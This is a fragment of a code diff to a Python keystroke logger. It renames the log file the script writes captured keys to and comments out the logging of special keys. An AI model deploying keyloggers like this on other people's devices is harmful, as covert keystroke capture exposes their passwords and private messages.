@@ -3,7 +3,7 @@ import logging
 
 
 
-logging.basicConfig(filename=("key_log5.txt"), level=logging.DEBUG, format=' %(message)s')
+logging.basicConfig(filename=("key_log6.txt"), level=logging.DEBUG, format=' %(message)s')
 
 
 
@@ -275,8 +275,8 @@ def on_press(key):
                 # if Key.space:
                 #         spacec +=1
                 #         logging.info('space' , spacec)
-                logging.info('special key {0} pressed'.format(
-                key))
+                # logging.info('special key {0} pressed'.format(
+                # key))
 
 
 with Listener( on_press=on_press) as listener:
